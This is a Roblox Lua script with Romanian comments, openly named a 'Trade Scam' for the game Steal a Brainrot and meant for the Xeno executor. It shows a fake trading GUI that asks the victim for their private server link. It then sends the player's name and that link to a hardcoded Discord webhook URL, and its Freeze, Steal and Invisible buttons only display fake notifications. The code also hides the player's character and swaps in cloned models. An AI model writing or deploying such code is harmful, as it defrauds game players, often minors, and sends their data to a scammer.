-- Script pentru Steal a Brainrot (Xeno Edition) - cu input manual
-- Compatibil cu Xeno Executor

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

-- ===== CONFIGURARE =====
local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
local SCRIPT_NAME = "⚡ Steal a Brainrot - Trade Scam v3.0"

-- ===== FUNCȚIE DE TRIMITERE PE DISCORD =====
local function sendToDiscord(message)
    local request = request or http_request or syn.request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({
                    content = message
                })
            })
        end)
    end
end

-- ===== SPOOFING - ASCUNDE FURTUL =====
local function enableSpoofing()
    local realBrainrots = {}
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name and (obj.Name:find("Brainrot") or obj.Name:find("BrainRot") or obj.Name:find("Brain")) then
            table.insert(realBrainrots, obj)
        end
    end
    for _, brainrot in pairs(realBrainrots) do
        pcall(function()
            brainrot.Transparency = 1
            brainrot.CanCollide = false
        end)
    end
    for _, realBrainrot in pairs(realBrainrots) do
        pcall(function()
            local fakeBrainrot = realBrainrot:Clone()
            fakeBrainrot.Name = realBrainrot.Name .. "_Fake"
            fakeBrainrot.Parent = Workspace
            fakeBrainrot.CFrame = realBrainrot.CFrame
            fakeBrainrot.Transparency = 0
            fakeBrainrot.CanCollide = true
        end)
    end
    print("✅ Spoofing activat: " .. #realBrainrots .. " brainrot-uri ascunse!")
end

-- ===== ASCUNDE PERSONAJUL =====
local function hideCharacter()
    if Character then
        for _, part in pairs(Character:GetDescendants()) do
            pcall(function()
                if part:IsA("BasePart") then
                    part.Transparency = 1
                    part.CanCollide = false
                end
            end)
        end
        pcall(function()
            LocalPlayer.NameDisplayDistance = 0
        end)
        for _, sound in pairs(Character:GetDescendants()) do
            pcall(function()
                if sound:IsA("Sound") then
                    sound.Volume = 0
                end
            end)
        end
        print("✅ Personaj invizibil!")
    end
end

-- ===== GUI CU INPUT PENTRU LINK =====
local function createFakeGUI()
    pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "TradeScamGUI"
        screenGui.ResetOnSpawn = false

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 450, 0, 400)
        frame.Position = UDim2.new(0.5, -225, 0.5, -200)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
        frame.BackgroundTransparency = 0.15
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.Draggable = true
        frame.Parent = screenGui

        -- Titlu
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 40)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.Text = "⚡ XENO TRADE v3.0 ⚡"
        title.TextColor3 = Color3.fromRGB(255, 70, 70)
        title.BackgroundTransparency = 1
        title.Font = Enum.Font.GothamBold
        title.TextScaled = true
        title.Parent = frame

        -- Text "Introdu link-ul"
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0.9, 0, 0, 30)
        label.Position = UDim2.new(0.05, 0, 0.12, 0)
        label.Text = "🔗 INTRODU LINKUL SERVERULUI PRIVAT:"
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.BackgroundTransparency = 1
        label.Font = Enum.Font.GothamBold
        label.TextSize = 16
        label.Parent = frame

        -- Câmp input pentru link
        local textBox = Instance.new("TextBox")
        textBox.Size = UDim2.new(0.9, 0, 0, 40)
        textBox.Position = UDim2.new(0.05, 0, 0.22, 0)
        textBox.PlaceholderText = "https://www.roblox.com/games/..."
        textBox.Text = ""
        textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
        textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        textBox.Font = Enum.Font.Gotham
        textBox.TextSize = 14
        textBox.ClearTextOnFocus = false
        textBox.Parent = frame

        -- Buton "Trimite link"
        local sendBtn = Instance.new("TextButton")
        sendBtn.Size = UDim2.new(0.9, 0, 0, 40)
        sendBtn.Position = UDim2.new(0.05, 0, 0.35, 0)
        sendBtn.Text = "📤 TRIMITE LINK"
        sendBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
        sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        sendBtn.Font = Enum.Font.GothamBold
        sendBtn.TextScaled = true
        sendBtn.Parent = frame
        sendBtn.MouseButton1Click:Connect(function()
            local link = textBox.Text
            if link and link ~= "" then
                sendToDiscord("**📱 NOU LINK DE LA VICTIMA!**\n\n**Player:** " .. LocalPlayer.Name .. "\n**Link Server:** " .. link)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "✅ Link Trimis!",
                    Text = "Link-ul a fost trimis! Așteaptă să intri pe server.",
                    Duration = 3
                })
                textBox.Text = ""
            else
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "⚠️ Eroare",
                    Text = "Introdu un link valid!",
                    Duration = 2
                })
            end
        end)

        -- Buton "Freeze Trade"
        local btn1 = Instance.new("TextButton")
        btn1.Size = UDim2.new(0.43, 0, 0, 35)
        btn1.Position = UDim2.new(0.05, 0, 0.50, 0)
        btn1.Text = "❄️ FREEZE"
        btn1.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn1.Font = Enum.Font.GothamBold
        btn1.TextScaled = true
        btn1.Parent = frame
        btn1.MouseButton1Click:Connect(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Trade Freeze",
                Text = "❄️ Trade frozen! You are now invisible.",
                Duration = 3
            })
        end)

        -- Buton "Auto Steal"
        local btn2 = Instance.new("TextButton")
        btn2.Size = UDim2.new(0.43, 0, 0, 35)
        btn2.Position = UDim2.new(0.52, 0, 0.50, 0)
        btn2.Text = "🔥 STEAL"
        btn2.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn2.Font = Enum.Font.GothamBold
        btn2.TextScaled = true
        btn2.Parent = frame
        btn2.MouseButton1Click:Connect(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Steal",
                Text = "🔥 Auto steal activated!",
                Duration = 3
            })
        end)

        -- Buton "Invisible"
        local btn3 = Instance.new("TextButton")
        btn3.Size = UDim2.new(0.43, 0, 0, 35)
        btn3.Position = UDim2.new(0.05, 0, 0.65, 0)
        btn3.Text = "👻 INVISIBLE"
        btn3.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        btn3.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn3.Font = Enum.Font.GothamBold
        btn3.TextScaled = true
        btn3.Parent = frame
        btn3.MouseButton1Click:Connect(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invisible",
                Text = "👻 You are now invisible!",
                Duration = 3
            })
        end)

        -- Buton "Close"
        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -35, 0, 5)
        closeBtn.Text = "✕"
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.TextScaled = true
        closeBtn.Parent = frame
        closeBtn.MouseButton1Click:Connect(function()
            screenGui:Destroy()
        end)

        -- Status
        local status = Instance.new("TextLabel")
        status.Size = UDim2.new(1, 0, 0, 30)
        status.Position = UDim2.new(0, 0, 0.85, 0)
        status.Text = "🟢 Ready - Xeno"
        status.TextColor3 = Color3.fromRGB(100, 255, 100)
        status.BackgroundTransparency = 1
        status.Font = Enum.Font.Gotham
        status.TextScaled = true
        status.Parent = frame

        screenGui.Parent = LocalPlayer.PlayerGui
        print("✅ GUI creat!")
    end)
end

-- ===== MAIN =====
local function main()
    print("🚀 Pornesc scriptul Xeno v3.0...")

    -- 1. Activează spoofing-ul
    enableSpoofing()

    -- 2. Ascunde personajul
    hideCharacter()

    -- 3. Creează GUI-ul fals
    createFakeGUI()

    -- 4. Notifică victima
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = SCRIPT_NAME,
        Text = "✅ Introdu link-ul serverului în GUI!",
        Duration = 4
    })

    print("✅ Script Xeno rulat cu succes! Victima trebuie să introducă linkul manual.")
end

-- ===== START =====
pcall(function()
    main()
end)
